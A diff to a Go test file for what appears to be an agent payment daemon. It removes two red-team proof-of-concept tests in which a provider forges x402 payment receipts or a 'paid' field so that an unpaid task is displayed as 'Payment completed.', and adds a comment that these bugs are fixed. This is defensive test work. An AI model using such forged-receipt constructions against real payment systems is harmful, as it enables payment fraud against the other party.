@@ -128,69 +128,9 @@ func noAuthorizationSigned(t *testing.T, d *Daemon, id string) bool {
 	return !signed && mustIX(t, d, id).PayState == interactions.PayNone
 }
 
-// ---------------------------------------------------------------------------
-// F2a: a free call (this node paid nothing, signed nothing). The provider's
-// result metadata carries x402.payment.receipts it made up. The node's own
-// check refuses them (evidence: verified=false), but they are stored as the
-// task's settlement history and the projection presents "Payment completed."
-// with x402.payment.status=payment-completed in status.message, where an
-// a2a-x402 client reads it (a2a-x402 v0.2 §5: task.status.message.metadata).
-func TestRedteamSI6_PeerReceiptsProjectedAsPaymentCompleted(t *testing.T) {
-	req, prov, id := rtPair(t)
-	deliverable := []byte(`{"capability":"text.free","status":"OK","verifiable":false}`)
-	forged := []any{map[string]any{"success": true, "transaction": "tx-forged-by-provider",
-		"network": "hub:" + prov.AID(), "amount": "1000", "payer": req.AID()}}
-	env := rtResult(t, req, prov, id, deliverable, map[string]any{
-		"anet.state": "completed", "anet.effect_status": "OK",
-		"x402.payment.status": "payment-completed", "x402.payment.receipts": forged,
-	}, "")
-	if r := receive(t, req, env); r.class != rxAccepted {
-		t.Fatalf("result not accepted: %+v", r)
-	}
-
-	if !noAuthorizationSigned(t, req, id) {
-		t.Fatal("precondition: this node must not have paid")
-	}
-	ev := lastLedgerPayload(t, req, EvPaymentSettled)
-	if ev["verified"] != false {
-		t.Fatalf("precondition: the node's own check must have refused the receipt, got %v", ev)
-	}
-
-	v := rtView(t, req, id)
-	msgMeta, _ := rtPath(v, "status", "message", "metadata").(map[string]any)
-	text, _ := json.Marshal(rtPath(v, "status", "message", "parts"))
-	taskRc, _ := json.Marshal(rtPath(v, "metadata", a2ashape.KeyX402Receipts))
-	if msgMeta[a2ashape.KeyX402Status] != a2ashape.PaymentCompleted ||
-		!strings.Contains(string(text), "Payment completed.") ||
-		!strings.Contains(string(taskRc), "tx-forged-by-provider") {
-		t.Fatalf("defect not reproduced: status.message=%v text=%s task receipts=%s",
-			rtPath(v, "status", "message"), text, taskRc)
-	}
-	t.Logf("ATTACK OK: unpaid task projected as %s / %q with receipts %s (own evidence: %v)",
-		msgMeta[a2ashape.KeyX402Status], text, taskRc, ev["refused"])
-}
-
-// F2b: the same with nothing but the deliverable: its "paid" field (which the
-// provider writes) makes the task's own metadata say payment-completed.
-func TestRedteamSI6_PeerPaidFieldProjectedAsPaymentCompleted(t *testing.T) {
-	req, prov, id := rtPair(t)
-	deliverable := []byte(`{"capability":"text.free","status":"OK","verifiable":false,` +
-		`"paid":{"transaction":"tx-forged-in-deliverable","amount":"1000","network":"hub:x"}}`)
-	env := rtResult(t, req, prov, id, deliverable, map[string]any{"anet.state": "completed", "anet.effect_status": "OK"}, "")
-	if r := receive(t, req, env); r.class != rxAccepted {
-		t.Fatalf("result not accepted: %+v", r)
-	}
-	if !noAuthorizationSigned(t, req, id) {
-		t.Fatal("precondition: this node must not have paid")
-	}
-	v := rtView(t, req, id)
-	st := rtPath(v, "metadata", a2ashape.KeyX402Status)
-	rc, _ := json.Marshal(rtPath(v, "metadata", a2ashape.KeyX402Receipts))
-	if st != a2ashape.PaymentCompleted || !strings.Contains(string(rc), `"success":true`) {
-		t.Fatalf("defect not reproduced: x402.payment.status=%v receipts=%s", st, rc)
-	}
-	t.Logf("ATTACK OK: task.metadata x402.payment.status=%v receipts=%s on a task this node never paid", st, rc)
-}
+// F2a/F2b (red team F11, forged receipts and "paid" projected as
+// payment-completed) are fixed; their PoCs are regression tests in
+// payverdict_test.go.
 
 // ---------------------------------------------------------------------------
 // F3: a deliverable without a status and result metadata
